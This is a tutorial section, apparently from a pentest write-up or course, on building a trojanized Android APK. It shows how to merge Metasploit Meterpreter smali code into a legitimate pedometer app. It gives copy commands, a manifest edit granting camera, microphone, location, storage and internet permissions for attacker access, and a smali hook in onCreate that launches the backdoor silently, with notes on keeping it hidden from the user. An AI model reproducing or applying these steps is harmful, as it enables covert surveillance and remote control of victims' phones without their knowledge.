# Payload Injection

This is the critical phase where the Meterpreter payload code is merged into the legitimate application, creating a functional trojanized APK.

## Phase 1: Copying Metasploit Smali Code

### Merging the Payload

cp -r payload_decoded/smali/com/metasploit original/smali/com/


**What this does:**
- Copies the entire `metasploit/` directory from payload
- Places it inside the original app's smali structure
- Maintains package hierarchy: `com.metasploit.stage.*`

**Result:**
The original app now contains Metasploit's backdoor code alongside its legitimate functionality.

### Verification

ls -la original/smali/com/metasploit/stage/


**Expected output:**
- Payload.smali
- MainActivity.smali
- Various helper classes

## Phase 2: Modifying AndroidManifest.xml

### Adding Required Permissions

The Meterpreter payload requires specific Android permissions to function:

nano original/AndroidManifest.xml

**Permissions added:**
<uses-permission android:name="android.permission.INTERNET"/> <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/> <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/> <uses-permission android:name="android.permission.CAMERA"/> <uses-permission android:name="android.permission.RECORD_AUDIO"/> <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/> <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/> <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/> <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/> ```
Why each permission is needed:

INTERNET - Connect to attacker server

CAMERA - Webcam capture capability

RECORD_AUDIO - Microphone access

LOCATION - GPS tracking

STORAGE - File system access

Declaring Metasploit Service
Added the Metasploit MainService to the manifest:
<service android:name="com.metasploit.stage.MainService" 
         android:exported="false"/>
This allows the payload to run as a background service.

Phase 3: Hooking the Payload
Injection Point Selection
Target: original/smali/com/example/pedometer/MainActivity.smali

Method: onCreate (runs when app launches)

Code Injection
Inserted this smali code at the beginning of the onCreate method:

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2

    # Start Metasploit payload
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/metasploit/stage/MainActivity;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v0}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    # Original onCreate code continues...
What this does:

Creates an Intent targeting Metasploit's MainActivity

Launches the payload when pedometer app starts

Original app functionality remains intact

Stealth Consideration
The payload launches silently without user interaction. The pedometer app displays normally while Meterpreter runs in the background.

Technical Deep Dive
Why Smali Editing?
Alternative approaches:

Decompile to Java (lossy, doesn't recompile perfectly)

Use binding tools like Backdoor-Factory (limited Android support)

Smali editing advantages:

Direct bytecode manipulation

No information loss during decompile/recompile

Full control over execution flow
Injection Strategy
Early execution hook:

onCreate runs immediately on app launch

Guarantees payload initialization

User sees normal app behavior
